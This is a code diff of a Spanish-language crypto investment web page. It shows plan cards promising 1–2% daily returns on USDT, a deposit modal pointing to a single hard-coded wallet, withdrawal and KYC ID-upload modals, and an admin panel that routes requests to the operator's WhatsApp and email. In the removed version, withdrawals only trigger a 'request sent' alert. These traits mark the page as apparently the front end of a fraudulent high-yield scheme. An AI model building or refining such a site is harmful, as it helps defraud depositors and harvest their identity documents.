-                        <p class="text-xs text-gray-500 mb-4">Min: 2 USDT | 15 Días</p>
-                        <button onclick="startInvest(1)" class="w-full bg-slate-100 text-slate-900 py-2 rounded font-bold hover:bg-slate-200">Elegir</button>
-                    </div>
-                    <div class="bg-white p-6 rounded-xl shadow-lg border border-purple-100 hover:scale-105 transition relative overflow-hidden">
-                        <div class="absolute top-0 right-0 bg-purple-500 text-white text-xs px-2 py-1">Recomendado</div>
-                        <h4 class="font-bold text-lg text-purple-600">Plan Avanzado</h4>
-                        <p class="text-3xl font-bold my-2">1.5% <span class="text-sm text-gray-400">/día</span></p>
-                        <p class="text-xs text-gray-500 mb-4">Min: 15 USDT | 10 Días</p>
-                        <button onclick="startInvest(2)" class="w-full bg-purple-600 text-white py-2 rounded font-bold hover:bg-purple-700">Elegir</button>
-                    </div>
-                    <div class="bg-white p-6 rounded-xl shadow-lg border border-yellow-100 hover:scale-105 transition">
-                        <h4 class="font-bold text-lg text-yellow-600">Plan VIP</h4>
-                        <p class="text-3xl font-bold my-2">2.0% <span class="text-sm text-gray-400">/día</span></p>
-                        <p class="text-xs text-gray-500 mb-4">Min: 50 USDT | 7 Días</p>
-                        <button onclick="startInvest(3)" class="w-full bg-slate-100 text-slate-900 py-2 rounded font-bold hover:bg-slate-200">Elegir</button>
-                    </div>
+            <h3 class="font-bold text-xl mb-4">Planes de Inversión</h3>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+                <div class="bg-white p-4 rounded-xl shadow hover:shadow-lg transition cursor-pointer" onclick="startInv(1)">
+                    <h4 class="font-bold text-blue-600">Plan Inicial</h4>
+                    <p class="text-2xl font-bold">1.0% <span class="text-sm font-normal text-gray-400">/dia</span></p>
+                    <p class="text-xs text-gray-500">Min: 2 USDT</p>
                 </div>
-            </section>
+                <div class="bg-white p-4 rounded-xl shadow hover:shadow-lg transition cursor-pointer border-2 border-purple-100" onclick="startInv(2)">
+                    <h4 class="font-bold text-purple-600">Plan Avanzado</h4>
+                    <p class="text-2xl font-bold">1.5% <span class="text-sm font-normal text-gray-400">/dia</span></p>
+                    <p class="text-xs text-gray-500">Min: 15 USDT</p>
+                </div>
+                <div class="bg-white p-4 rounded-xl shadow hover:shadow-lg transition cursor-pointer" onclick="startInv(3)">
+                    <h4 class="font-bold text-yellow-600">Plan VIP</h4>
+                    <p class="text-2xl font-bold">2.0% <span class="text-sm font-normal text-gray-400">/dia</span></p>
+                    <p class="text-xs text-gray-500">Min: 50 USDT</p>
+                </div>
+            </div>
 
-            <section class="bg-white p-6 rounded-xl shadow">
-                <h3 class="font-bold text-lg mb-4 border-b pb-2">Mis Inversiones</h3>
-                <div class="overflow-x-auto">
-                    <table class="w-full text-sm text-left">
-                        <thead class="bg-gray-50"><tr><th class="p-3">Plan</th><th class="p-3">Monto</th><th class="p-3">Días Restantes</th></tr></thead>
-                        <tbody id="investment-list"><tr><td colspan="3" class="p-4 text-center text-gray-400">No hay inversiones activas</td></tr></tbody>
-                    </table>
-                </div>
-            </section>
+            <div class="bg-white p-4 rounded-xl shadow">
+                <h4 class="font-bold border-b pb-2 mb-2">Mis Inversiones</h4>
+                <div id="inv-list"></div>
+            </div>
         </main>
     </div>
 
-    <div id="landing-view" class="fixed inset-0 z-0 flex items-center justify-center bg-gradient-to-br from-slate-900 to-slate-800">
+    <div id="admin-panel" class="hidden fixed inset-0 bg-gray-100 z-50 overflow-auto">
+        <div class="bg-slate-800 text-white p-4 flex justify-between sticky top-0">
+            <h3>Admin Panel</h3> <button onclick="toggleAdmin()">Cerrar</button>
         </div>
+        <div class="p-4">
+            <div class="bg-white p-4 rounded shadow mb-4">Usuarios Totales: <span id="adm-users" class="font-bold">0</span></div>
+            <p class="text-sm text-gray-500">Las solicitudes llegan a tu WhatsApp y Email con enlaces de acción.</p>
+        </div>
+    </div>
 
-    <div id="invest-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 items-center justify-center z-50"><div class="bg-white p-6 rounded w-full max-w-sm"><h4 class="font-bold text-xl mb-2">Invertir</h4><input type="number" id="inv-amount" class="border w-full p-2 mb-2" placeholder="Cantidad"><button onclick="doInvest()" class="bg-blue-600 text-white w-full py-2 rounded">Confirmar</button><button onclick="closeModal('invest-modal')" class="w-full mt-2">Cancelar</button></div></div>
-    <div id="deposit-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 items-center justify-center z-50"><div class="bg-white p-6 rounded w-full max-w-sm"><h4 class="font-bold text-xl mb-2">Depositar</h4><p class="bg-gray-100 p-2 text-xs mb-2">Wallet: 0xc0bd...d51bf8</p><input type="number" id="dep-amount" class="border w-full p-2 mb-2" placeholder="Monto"><button onclick="doDeposit()" class="bg-green-600 text-white w-full py-2 rounded">Confirmar</button><button onclick="closeModal('deposit-modal')" class="w-full mt-2">Cancelar</button></div></div>
-    <div id="withdraw-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 items-center justify-center z-50"><div class="bg-white p-6 rounded w-full max-w-sm"><h4 class="font-bold text-xl mb-2">Retirar</h4><input type="number" id="wd-amount" class="border w-full p-2 mb-2" placeholder="Monto"><button onclick="alert('Solicitud enviada')" class="bg-red-600 text-white w-full py-2 rounded">Retirar</button><button onclick="closeModal('withdraw-modal')" class="w-full mt-2">Cancelar</button></div></div>
-    <div id="kyc-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 items-center justify-center z-50"><div class="bg-white p-6 rounded w-full max-w-sm"><h4 class="font-bold text-xl mb-2">KYC</h4><p class="text-sm mb-2">Sube foto de tu ID</p><button onclick="processKYC()" class="bg-green-600 text-white w-full py-2 rounded">Enviar</button><button onclick="closeModal('kyc-modal')" class="w-full mt-2">Cancelar</button></div></div>
-
-    <div id="toast" class="fixed bottom-5 right-5 px-6 py-3 rounded shadow-xl text-white opacity-0 translate-y-10 transition-all duration-300 z-50 pointer-events-none"></div>
+    <div id="dep-modal" class="hidden fixed inset-0 bg-black/70 items-center justify-center z-50"><div class="bg-white p-6 rounded-xl w-full max-w-sm"><h3 class="font-bold text-xl mb-4">Depositar</h3><p class="bg-gray-100 p-2 text-xs mb-4 break-all">Wallet: 0xc0bd02951cc4858bd1f759ddd10f632a69d51bf8</p><input type="number" id="dep-amount" placeholder="Monto" class="border w-full p-2 mb-4"><button onclick="doDeposit()" class="bg-green-600 text-white w-full py-2 rounded font-bold">Confirmar Pago</button><button onclick="closeModal('dep-modal')" class="w-full mt-2 text-sm">Cancelar</button></div></div>
+    
+    <div id="wd-modal" class="hidden fixed inset-0 bg-black/70 items-center justify-center z-50"><div class="bg-white p-6 rounded-xl w-full max-w-sm"><h3 class="font-bold text-xl mb-4">Retirar</h3><input id="wd-wallet" placeholder="Wallet Destino" class="border w-full p-2 mb-2"><input type="number" id="wd-amount" placeholder="Monto" class="border w-full p-2 mb-4"><button onclick="doWithdraw()" class="bg-red-600 text-white w-full py-2 rounded font-bold">Solicitar</button><button onclick="closeModal('wd-modal')" class="w-full mt-2 text-sm">Cancelar</button></div></div>
+    
+    <div id="inv-modal" class="hidden fixed inset-0 bg-black/70 items-center justify-center z-50"><div class="bg-white p-6 rounded-xl w-full max-w-sm"><h3 class="font-bold text-xl mb-4">Invertir</h3><input type="number" id="inv-amount" placeholder="Monto" class="border w-full p-2 mb-4"><button onclick="doInvest()" class="bg-blue-600 text-white w-full py-2 rounded font-bold">Confirmar</button><button onclick="closeModal('inv-modal')" class="w-full mt-2 text-sm">Cancelar</button></div></div>
+    
+    <div id="kyc-modal" class="hidden fixed inset-0 bg-black/70 items-center justify-center z-50"><div class="bg-white p-6 rounded-xl w-full max-w-sm"><h3 class="font-bold text-xl mb-4">Verificar ID</h3><p class="text-sm mb-4">Sube foto de tu documento.</p><button onclick="doKYC()" class="bg-slate-900 text-white w-full py-2 rounded font-bold">Enviar Documentos</button><button onclick="closeModal('kyc-modal')" class="w-full mt-2 text-sm">Cancelar</button></div></div>
 
 </body>
 </html>
